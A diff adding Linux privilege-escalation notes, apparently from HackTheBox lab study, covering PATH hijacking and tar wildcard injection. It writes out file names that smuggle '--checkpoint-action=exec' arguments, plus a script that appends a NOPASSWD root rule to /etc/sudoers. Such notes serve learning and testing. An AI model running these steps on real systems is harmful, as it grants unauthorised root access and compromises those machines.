@@ -84,6 +84,49 @@ Check for files for the setgroupid
 
 	find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
 
+## Check PATH abuse
+
+If some script is running with sudo and we can change the PATH var, then we can use it to run commands as sudo, for example:
+
+	touch ls
+	echo 'echo "PATH ABUSE!!"' > ls
+	chmod +x ls
+	PATH=.:${PATH}
+	export PATH
+	echo $PATH
+
+If ls is then called by the root user, or an user with sudo priveleges, we execute commands with those privileges
+
+## Check for Wildcard abuse
+
+If commands are being runned in sudo that contain wildcards like *, we may be able to inject commands that will be run as sudo example:
+
+	a cron with:
+
+	mh dom mon dow command
+	*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
+
+	then in the dir /home/htb-student we do the following commands:
+
+	echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+	echo "" > "--checkpoint-action=exec=sh root.sh"
+	echo "" > --checkpoint=1
+
+	the two --checkpoints arguments will be added to the tar * and execute the root.sh script as sudo
+	Simple trick behind this technique is that when using shell wildcards, especially asterisk (*), Unix shell will interpret files beginning with hyphen (-) character as command line arguments to executed command/program.
+
+Commands susceptible to this are:
+
+	tar
+	chown
+	chmod
+	rsync
+	7z
+	zip
+
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
+https://www.exploit-db.com/papers/33930
+
 ## Run linPEAS script
 
 	https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
